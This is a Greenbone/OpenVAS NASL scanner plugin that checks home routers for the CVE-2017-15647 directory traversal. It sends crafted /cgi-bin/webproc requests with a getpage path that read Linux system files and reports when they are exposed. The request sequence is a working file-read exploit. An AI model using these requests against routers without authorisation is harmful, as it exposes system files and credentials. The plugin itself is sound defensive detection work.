if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.140448" );
	script_version( "2021-09-14T11:01:46+0000" );
	script_tag( name: "last_modification", value: "2021-09-14 11:01:46 +0000 (Tue, 14 Sep 2021)" );
	script_tag( name: "creation_date", value: "2017-10-24 09:17:33 +0700 (Tue, 24 Oct 2017)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2017-11-07 15:02:00 +0000 (Tue, 07 Nov 2017)" );
	script_cve_id( "CVE-2017-15647" );
	script_tag( name: "qod_type", value: "exploit" );
	script_name( "Multiple Router Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_get_http_banner.sc", "os_detection.sc" );
	script_require_keys( "Host/runs_unixoide" );
	script_mandatory_keys( "mini_httpd/banner" );
	script_require_ports( "Services/www", 8080 );
	script_tag( name: "summary", value: "Multiple home router products are prone to a directory traversal
  vulnerability." );
	script_tag( name: "insight", value: "On multiple home router products (e.g. FiberHome, PLC Systems), a directory
  traversal vulnerability exists in /cgi-bin/webproc via the getpage parameter in conjunction with a crafted
  var:page value." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_xref( name: "URL", value: "https://blogs.securiteam.com/index.php/archives/3472" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 8080 );
req = http_get( port: port, item: "/cgi-bin/webproc?getpage=html/index.html&errorpage=html/main.html&var:language=zh_cn&var:menu=setup&var:page=connected&var:retag=1&var:subpage=-" );
res = http_keepalive_send_recv( port: port, data: req );
files = traversal_files( "linux" );
cookie = http_get_cookie_from_header( buf: res, pattern: "(sessionid=[^;]+)" );
if(cookie){
	cookie += "; language=en_us";
	for pattern in keys( files ) {
		file = files[pattern];
		url = "/cgi-bin/webproc?getpage=/" + file + "&amp;var:language=en_us&amp;var:page=wizardfifth";
		req = http_get_req( port: port, url: url, add_headers: make_array( "Cookie", cookie ) );
		res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
		if(egrep( string: res, pattern: pattern )){
			report = "It was possible to obtain the '/" + file + "' file.\\n\\nResult:\\n" + res;
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 0 );

